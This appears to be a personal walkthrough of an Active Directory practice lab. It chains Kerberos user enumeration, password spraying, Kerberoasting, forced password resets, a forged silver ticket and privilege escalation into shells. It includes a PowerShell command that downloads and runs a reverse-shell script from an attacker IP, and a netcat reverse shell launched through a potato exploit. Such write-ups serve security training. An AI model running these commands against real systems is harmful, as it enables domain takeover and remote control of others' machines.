smb, rpc, ldap all locked down for anonymous enum. What good AD doesnt!
Port 80 has team page, with all the members name
we copy them, format them and feed to usernamge_generator.py
```zsh
python /opt/name_to_username/username_generator.py -w users.txt > usernames.txt
#feed it to kerbrute
./kerbrute userenum --dc 192.168.233.21 -d nagoya-industries.com usernames.txt
#and re-process the usernames file
impacket-GetNPUsers nagoya-industries.com/ -dc-ip 192.168.233.21 -usersfile usernames.txt -format john -outputfile hashes.txt -no-pass
#no use, though
```
Appearently, we're supposed to generate a wordlist with seasonYEAR, and spray it accross the usernames we validated
We spray and find out it is for fiona.clark. no special shares
But --users gave us new 4 users - svc_helpdesk, svc_tpl, svc_web, svc_mysql

```zsh
impacket-GetUserSPNs -dc-ip 192.168.233.21 nagoya-industries.com/fiona.clark
#we find svc_mysql and svc_helpdesk
impacket-GetUserSPNs -dc-ip 192.168.233.21 nagoya-industries.com/fiona.clark -request-user svc_mssql 
#cracks out to be Service1
impacket-GetUserSPNs -dc-ip 192.168.233.21 nagoya-industries.com/fiona.clark -request-user svc_helpdesk
#not cracked
```
Couldnt go much farther with what we have. even bloodhound was just taking us in circles
HINT TAKEN : go to sysvol/Nagoya-industries/scripts/ResetPassword.exe
`strings -e l ResetPassword.exe` or DNSpy to get password for svc_helpdesk to ultimately reset password of christopher.lweis

But we see a path from fiona to christopher, and so we'll try it
```zsh
bloodyAD --host 192.168.233.21 -d nagoya-industries.com -u fiona.clark -p 'Summer2023' set password 'bethan.webster' 'newPassword1!'

bloodyAD --host 192.168.233.21 -d nagoya-industries.com -u bethan.webster -p 'newPassword1!' set password 'christopher.lewis' 'newPassword1!'

evil-winrm -i 192.168.233.21  -u 'christopher.lewis' -p 'newPassword1!'
```
christopher!

---
again, couldnt see any path forward. should've known the mssql port is 1433, and listening
Port-forwarding wouldve let us impacket-mssqlclient

So we stand ligolo up
and try to connect to the mssql
`impacket-mssqlclient nagoya-industries.com/svc_mssql:'Service1'@240.0.0.1 -windows-auth`
But we cannot run xp_cmdshell

HINT TAKEN : Perform a silver ticket attack, so we can impersonate to be the administrator running mssql, and hence get ability to run the xp_cmdshell. This works since mssql is a service user (can verify by sending an xp_dirtree and looking at responder)

To perform the Silver Ticket attack, we need 3 things
- NT hash of password of user we own (use some online tool) 
- Domain SID  `Get-AdDomain` or bloodhound
- SPN of the service account we own `Get-ADUser -Filter {SamAccountName -eq "svc_mssql"} -Properties ServicePrincipalNames` or bloodhound
NThash = E3A0168BC21CFB88B95C954A5B18F57C
Domain SID = S-1-5-21-1969309164-1513403977-1686805993
SPN = MSSQL/nagoya.nagoya-industries.com

```zsh
impacket-ticketer -nthash E3A0168BC21CFB88B95C954A5B18F57C -domain-sid "S-1-5-21-1969309164-1513403977-1686805993" -domain nagoya-industries.com -spn MSSQL/nagoya.nagoya-industries.com Administrator

export KRB5CCNAME=Administrator.ccache
klist #to verify

#create this file
sudo vi /etc/krb5user.conf
#write these into it
[libdefaults]  
		default_realm = NAGOYA-INDUSTRIES.COM  
		kdc_timesync = 1  
		ccache_type = 4  
		forwardable = true  
		proxiable = true  
	rdns = false  
	dns_canonicalize_hostname = false  
		fcc-mit-ticketflags = true  
  
[realms]  
		NAGOYA-INDUSTRIES.COM = {  
				kdc = nagoya.nagoya-industries.com  
		}  
  
[domain_realm]  
		.nagoya-industries.com = NAGOYA-INDUSTRIES.COM
```
Temporarily add 240.0.0.1 to the /etc/hosts file and comment the actual IP
```zsh
impacket-mssqlclient -k nagoya.nagoya-industries.com
enable_xp_cmdshell
xp_cmdshell whoami
#make ready nishang's 1 liner, call it rshell.ps1
xp_cmdshell powershell IEX(New-Object Net.WebClient).downloadString(\"http://192.168.45.249/rshell.ps1\")
```
svc_mssql!

---
whoami /all shows seImpersonate
send over the god and nc
`.\gp.exe -cmd "C:\programdata\nc.exe -nv 192.168.45.249 9001 -e cmd.exe"`
and we're admin!